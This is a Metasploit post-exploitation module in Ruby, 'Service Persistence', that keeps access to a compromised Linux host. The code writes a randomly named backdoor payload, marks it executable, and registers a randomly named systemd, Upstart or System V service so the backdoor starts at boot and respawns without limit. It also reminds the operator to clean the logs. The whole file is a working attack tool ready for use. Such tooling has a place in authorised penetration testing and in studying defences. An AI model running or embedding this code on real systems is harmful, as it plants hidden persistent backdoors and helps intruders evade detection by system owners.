##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/post/file'

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'Service Persistence',
        'Description'    => %q(
          This module will create a service on the box, and mark it for auto-restart.
          We need enough access to write service files and potentially restart services
          Targets:
            System V:
              CentOS <= 5
              Debian <= 6
              Kali 2.0
              Ubuntu <= 9.04
            Upstart:
              CentOS 6
              Ubuntu >= 9.10, <= 14.10
            systemd:
              CentOS 7
              Debian >=7, <=8
              Ubuntu >= 15.04
          Note: System V won't restart the service if it dies, only an init change (reboot etc) will restart it.
        ),
        'License'        => MSF_LICENSE,
        'Author'         =>
          [
            'h00die <mike@shorebreaksecurity.com>'
          ],
        'Platform'       => ['unix', 'linux'],
        'Targets'        =>
          [
            ['Auto',     {}],
            ['System V', { 'runlevel' => '2 3 4 5' }],
            ['Upstart',  { 'runlevel' => '2345' }],
            ['systemd',  {}]
          ],
        'DefaultTarget'  => 0,
        'Arch'           => ARCH_CMD,
        'References'     =>
          [
            ['URL', 'https://www.digitalocean.com/community/tutorials/how-to-configure-a-linux-service-to-start-automatically-after-a-crash-or-reboot-part-1-practical-examples']
          ],
        'Payload'        =>
        {
          'Compat'     =>
          {
            'PayloadType'  => 'cmd',
            'RequiredCmd'  => 'python netcat' # we need non-threaded/forked so the systems properly detect the service going down
          }
        },
        'DefaultOptions' =>
          {
            'WfsDelay' => 5
          },
        'DisclosureDate' => 'Jan 1 1983', # system v release date
      )
    )

    register_options(
      [
        OptPath.new('SHELLPATH', [true, 'Writable path to put our shell', '/usr/local/bin'])
      ], self.class
    )
  end

  def exploit
    backdoor = write_shell(datastore['SHELLPATH'])
    path = backdoor.split(File::SEPARATOR)[0...-1].join('/')
    file = backdoor.split(File::SEPARATOR)[-1]
    case target.name
    when 'System V'
      system_v(path, file, target.opts['runlevel'], service_system_exists?('update-rc.d'))
    when 'Upstart'
      upstart(path, file, target.opts['runlevel'])
    when 'systemd'
      systemd(path, file)
    else
      if service_system_exists?('systemctl')
        print_status('Utilizing systemd')
        systemd(path, file)
      end
      if service_system_exists?('initctl')
        print_status('Utilizing Upstart')
        upstart(path, file, '2345')
      end
      has_updatercd = service_system_exists?('update-rc.d')
      if has_updatercd || service_system_exists?('chkconfig') # centos 5
        print_status('Utilizing System_V')
        system_v(path, file, '2 3 4 5', has_updatercd)
      else
        print_error('Unable to detect service system')
        register_file_for_cleanup(backdoor)
      end
    end
  end

  def service_system_exists?(command)
    service_cmd = cmd_exec("which #{command}")
    !(service_cmd.empty? || service_cmd.include?('no'))
  end

  def write_shell(path)
    backdoor = "#{path}/#{Rex::Text.rand_text_alpha(5)}"
    vprint_status("Writing backdoor to #{backdoor}")
    write_file(backdoor, payload.encoded)
    cmd_exec("chmod 711 #{backdoor}")
    backdoor
  end

  def systemd(backdoor_path, backdoor_file)
    # https://coreos.com/docs/launching-containers/launching/getting-started-with-systemd/
    script = "[Unit]\n"
    script << "Description=Start daemon at boot time\n"
    script << "After=networking.service\n"
    script << "Requires=networking.service\n"
    script << "[Service]\n"
    script << "RestartSec=10s\n"
    script << "Restart=always\n"
    script << "TimeoutStartSec=5\n"
    script << "ExecStart=/bin/sh #{backdoor_path}#{File::SEPARATOR}#{backdoor_file}\n"
    script << "[Install]\n"
    script << "WantedBy=multi-user.target\n"

    service_filename = Rex::Text.rand_text_alpha(7)
    vprint_status("Writing service: /lib/systemd/system/#{service_filename}.service")
    write_file("/lib/systemd/system/#{service_filename}.service", script)
    vprint_status('Enabling service')
    cmd_exec("systemctl enable #{service_filename}.service")
    vprint_status('Starting service')
    cmd_exec("systemctl start #{service_filename}.service")
  end

  def upstart(backdoor_path, backdoor_file, runlevel)
    # http://blog.terminal.com/getting-started-with-upstart/
    script = "description \"Start daemon at boot time\"\n"
    script << "start on filesystem or runlevel [#{runlevel}]\n"
    script << "stop on shutdown\n"
    script << "script\n"
    script << "    cd #{backdoor_path}\n"
    script << "    echo $$ > /var/run/#{backdoor_file}.pid\n"
    script << "    exec #{backdoor_file}\n"
    script << "end script\n"
    script << "post-stop exec sleep 10\n"
    script << "respawn\n"
    script << "respawn limit unlimited\n"

    service_filename = Rex::Text.rand_text_alpha(7)
    vprint_status("Writing service: /etc/init/#{service_filename}.conf")
    write_file("/etc/init/#{service_filename}.conf", script)
    vprint_status('Starting service')
    cmd_exec("initctl start #{service_filename}")
    vprint_status("Dont forget to clean logs: /var/log/upstart/#{service_filename}.log")
  end

  def system_v(backdoor_path, backdoor_file, runlevel, has_updatercd)
    if has_updatercd
      print_status('Utilizing update-rc.d')
    else
      print_status('Utilizing chkconfig')
    end
    script = "#!/bin/sh\n"
    script << "### BEGIN INIT INFO\n"
    script << "# Provides: service\n"
    script << "# Required-Start: $network\n"
    script << "# Required-Stop: $network\n"
    script << "# Default-Start:     #{runlevel}\n"
    script << "# Default-Stop:      0 1 6\n"
    script << "# Short-Description: Start daemon at boot time\n"
    script << "# Description:       Enable service provided by daemon.\n"
    script << "### END INIT INFO\n"
    script << "dir=\"#{backdoor_path}\"\n"
    script << "cmd=\"#{backdoor_file}\"\n"
    script << "name=`basename $0`\n"
    script << "pid_file=\"/var/run/$name.pid\"\n"
    script << "stdout_log=\"/var/log/$name.log\"\n"
    script << "stderr_log=\"/var/log/$name.err\"\n"
    script << "get_pid() {\n"
    script << "    cat \"$pid_file\"\n"
    script << "}\n"
    script << "is_running() {\n"
    script << "    [ -f \"$pid_file\" ] && ps `get_pid` > /dev/null 2>&1\n"
    script << "}\n"
    script << "case \"$1\" in\n"
    script << "    start)\n"
    script << "    if is_running; then\n"
    script << "        echo \"Already started\"\n"
    script << "    else\n"
    script << "        echo \"Starting $name\"\n"
    script << "        cd \"$dir\"\n"
    if has_updatercd
      script << "        sudo $cmd >> \"$stdout_log\" 2>> \"$stderr_log\" &\n"
    else # CentOS didn't like sudo or su...
      script << "        $cmd >> \"$stdout_log\" 2>> \"$stderr_log\" &\n"
    end
    script << "        echo $! > \"$pid_file\"\n"
    script << "        if ! is_running; then\n"
    script << "            echo \"Unable to start, see $stdout_log and $stderr_log\"\n"
    script << "            exit 1\n"
    script << "        fi\n"
    script << "    fi\n"
    script << "    ;;\n"
    script << "    stop)\n"
    script << "    if is_running; then\n"
    script << "        echo -n \"Stopping $name..\"\n"
    script << "        kill `get_pid`\n"
    script << "        for i in {1..10}\n"
    script << "        do\n"
    script << "            if ! is_running; then\n"
    script << "                break\n"
    script << "            fi\n"
    script << "            echo -n \".\"\n"
    script << "            sleep 1\n"
    script << "        done\n"
    script << "        echo\n"
    script << "        if is_running; then\n"
    script << "            echo \"Not stopped; may still be shutting down or shutdown may have failed\"\n"
    script << "            exit 1\n"
    script << "        else\n"
    script << "            echo \"Stopped\"\n"
    script << "            if [ -f \"$pid_file\" ]; then\n"
    script << "                rm \"$pid_file\"\n"
    script << "            fi\n"
    script << "        fi\n"
    script << "    else\n"
    script << "        echo \"Not running\"\n"
    script << "    fi\n"
    script << "    ;;\n"
    script << "    restart)\n"
    script << "    $0 stop\n"
    script << "    if is_running; then\n"
    script << "        echo \"Unable to stop, will not attempt to start\"\n"
    script << "        exit 1\n"
    script << "    fi\n"
    script << "    $0 start\n"
    script << "    ;;\n"
    script << "    status)\n"
    script << "    if is_running; then\n"
    script << "        echo \"Running\"\n"
    script << "    else\n"
    script << "        echo \"Stopped\"\n"
    script << "        exit 1\n"
    script << "    fi\n"
    script << "    ;;\n"
    script << "    *)\n"
    script << "    echo \"Usage: $0 {start|stop|restart|status}\"\n"
    script << "    exit 1\n"
    script << "    ;;\n"
    script << "esac\n"
    script << "exit 0\n"

    service_filename = Rex::Text.rand_text_alpha(7)
    vprint_status("Writing service: /etc/init.d/#{service_filename}")
    write_file("/etc/init.d/#{service_filename}", script)
    cmd_exec("chmod 755 /etc/init.d/#{service_filename}")
    vprint_status('Enabling & starting our service')
    if has_updatercd
      cmd_exec("update-rc.d #{service_filename} defaults")
      cmd_exec("update-rc.d #{service_filename} enable")
      cmd_exec("service #{service_filename} start")
    else # CentOS
      cmd_exec("chkconfig --add #{service_filename}")
      cmd_exec("chkconfig #{service_filename} on")
      cmd_exec("/etc/init.d/#{service_filename} start")
    end
  end
end
